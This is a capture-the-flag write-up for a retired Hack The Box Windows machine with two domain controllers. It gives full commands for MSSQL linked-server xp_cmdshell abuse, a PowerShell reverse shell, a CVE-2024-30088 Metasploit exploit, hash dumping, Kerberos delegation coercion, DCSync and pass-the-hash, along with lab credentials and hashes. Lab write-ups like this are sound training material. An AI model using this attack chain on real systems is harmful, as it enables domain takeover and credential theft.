# DarkZero

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=flat-square) ![Released](https://img.shields.io/badge/Released-2025--10--04-informational?style=flat-square)

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Hard |
| **Release** | October 4, 2025 |
| **Rating** | 4.4 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A two-DC forest: `DC01` in `darkzero.htb` and `DC02` in `darkzero.ext`. Starting MSSQL credentials for `john.w` are guest-level on DC01, but a **linked server** maps them to `dc01_sql_svc` — sysadmin on DC02 — so `xp_cmdshell` executes through the link. A **CVE-2024-30088** kernel exploit gives SYSTEM on DC02 and the user flag. Because every DC has unconstrained delegation by default, coercing DC01 to authenticate to DC02 captures `DC01$`'s TGT, which DCSyncs the DC01 Administrator hash for the root flag.

---

Architecture: two DCs — DC01 (`darkzero.htb`) and DC02 (`darkzero.ext`, internal `172.16.20.2`).

## Attack Chain Summary

```
MSSQL creds (john.w) → linked server to DC02 (as dc01_sql_svc)
  → xp_cmdshell on DC02 → shell as svc_sql
    → CVE-2024-30088 kernel exploit → SYSTEM on DC02 → hashdump → user flag
      → Rubeus monitor + Coercer (unconstrained delegation) → DC01$ TGT
        → secretsdump DCSync → DC01 Administrator hash
          → evil-winrm → root flag on DC01
```

---

## Phase 1: Reconnaissance

### Services (DC01 — <TARGET_IP>)

| Port | Service | Version |
|------|---------|---------|
| 88 | Kerberos | — |
| 389 | LDAP | — |
| 445 | SMB | — |
| 1433 | MSSQL | Microsoft SQL Server 2022 RTM (16.0.1000) |

### Initial credentials

`john.w` : `RFulUtONCOL!` (Windows auth, guest on DC01's MSSQL instance).

---

## Phase 2: MSSQL Linked Server Exploitation

### Connection

```bash
impacket-mssqlclient 'darkzero.htb/john.w:RFulUtONCOL!'@<TARGET_IP> -windows-auth
```

### Linked server enumeration

```sql
enum_links
```

| Linked Server | Remote Login |
|---------------|-------------|
| DC02.darkzero.ext | dc01_sql_svc |

`john.w` maps to `dc01_sql_svc` on DC02 — **sysadmin on the linked server** while only guest locally.

### Enable xp_cmdshell via the linked server

Direct execution on DC01 is denied (guest), so execute through the DC02 link:

```sql
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC ('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
-- Returns: darkzero-ext\svc_sql
```

### Reverse shell (base64-encoded to avoid quote escaping)

```sql
EXEC ('xp_cmdshell ''powershell -enc <BASE64_REVSHELL>''') AT [DC02.darkzero.ext]
```

Shell as `darkzero-ext\svc_sql` on DC02 — Windows Server 2022 Datacenter Build 20348, PDC for `darkzero.ext`, internal IP `172.16.20.2`.

---

## Phase 3: Privilege Escalation — CVE-2024-30088

### Enumeration

```
whoami /priv
SeChangeNotifyPrivilege       Enabled
SeCreateGlobalPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Disabled
```

**No `SeImpersonatePrivilege`** — potato attacks are out. Windows Server 2022 Build 20348.2113 is vulnerable to **CVE-2024-30088**.

### CVE-2024-30088 (Windows kernel elevation of privilege)

Used the Metasploit module `exploit/windows/local/cve_2024_30088_authz_basep`:

1. Get a meterpreter session via a staged payload (upload `shell.exe` over an HTTP server).
2. **Migrate to `sqlservr.exe`** — critical for stability; the session dies without it.
3. Run the CVE-2024-30088 exploit.

```
use exploit/windows/local/cve_2024_30088_authz_basep
set SESSION <meterpreter_session>
set LHOST <attacker_ip>
set LPORT 7777
run
```

**Key lesson:** the exploit kills unstable processes. You must migrate to a long-lived process (`sqlservr.exe`) before running it. The first two sessions died; the third succeeded after migration.

### SYSTEM on DC02

```
hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6963aad8ba1150192f3ca6341355eb49:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:43e27ea2be22babce4fbcff3bc409a9d:::
svc_sql:1103:aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f:::
DC02$:1000:aad3b435b51404eeaad3b435b51404ee:663a13eb19800202721db4225eadc38e:::
```

The user flag lives on DC02 under `C:\Users\Administrator\Desktop\` — not in `svc_sql`'s home, so SYSTEM/admin access was required to reach it.

---

## Phase 4: Lateral Movement — DC01 via Unconstrained Delegation

DC02 is a Domain Controller, so it has unconstrained delegation by default. Strategy: coerce DC01 into authenticating to DC02 and capture its TGT.

### Rubeus monitor (on DC02 as SYSTEM)

```cmd
.\r.exe monitor /interval:5 /nowrap
```

### Coerce DC01 authentication (from the attacker)

```bash
pip install coercer
coercer coerce -u john.w -p 'RFulUtONCOL!' -d darkzero.htb \
  -t DC01.darkzero.htb -l DC02.darkzero.ext
```

Rubeus captures the **DC01$@DARKZERO.HTB** TGT.

### Convert and use the ticket

```bash
# Convert kirbi to ccache
python3 ticketConverter.py dc01.kirbi dc01.ccache

# Sync clock (CRITICAL — KRB_AP_ERR_SKEW without it)
sudo ntpdate <target_ip>

# DCSync for DC01 Administrator
export KRB5CCNAME=dc01.ccache
secretsdump.py 'DC01@DC01.darkzero.htb' -k -no-pass -just-dc-user Administrator
```

DC01 Administrator hash: `5917507bdf2ef2c2b0a869a1cba40726`.

### Root flag

```bash
evil-winrm -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -i <TARGET_IP>
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. **MSSQL linked servers** — being guest on the local server doesn't matter if the linked server maps you to sysadmin. Always run `enum_links`.
2. **Quote escaping in linked-server `xp_cmdshell`** — use base64-encoded PowerShell (`-enc`) to avoid nested-quote hell.
3. **CVE-2024-30088** — Windows Server 2022 kernel privesc. **Migrate meterpreter to a stable process first** (`sqlservr.exe`); the session dies if run from a `cmd.exe`/`powershell.exe` spawned by `xp_cmdshell`.
4. **Unconstrained delegation on DCs** — all DCs have it by default. Coerce authentication from one DC to another, capture the TGT, then DCSync.
5. **Clock skew** — always `ntpdate` before Kerberos operations. `KRB_AP_ERR_SKEW` is the single biggest time-waster.
6. **Two-domain architecture** — the user flag is on the child DC (`darkzero.ext`) and the root flag on the parent DC (`darkzero.htb`). The pivot is mandatory.
7. **Coercer over SpoolSample** — a Python package, works reliably, no binary compilation needed.

## Dead Ends

- `xp_cmdshell` directly on DC01 — guest permissions, denied.
- `SeImpersonatePrivilege` — not available to `svc_sql`, so potato attacks are impossible.
- CVE-2024-30088 without process migration — the session dies every time.
- `dir \\DC01\C$` from DC02 as SYSTEM — access denied (`DC02$` isn't admin on DC01).
- `secretsdump` without clock sync — `KRB_AP_ERR_SKEW`.

## Tools Used

impacket (`mssqlclient`, `secretsdump.py`, `ticketConverter.py`), Metasploit (`multi/handler`, `cve_2024_30088_authz_basep`), Rubeus (TGT monitor + pass-the-ticket), Coercer, evil-winrm, msfvenom.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
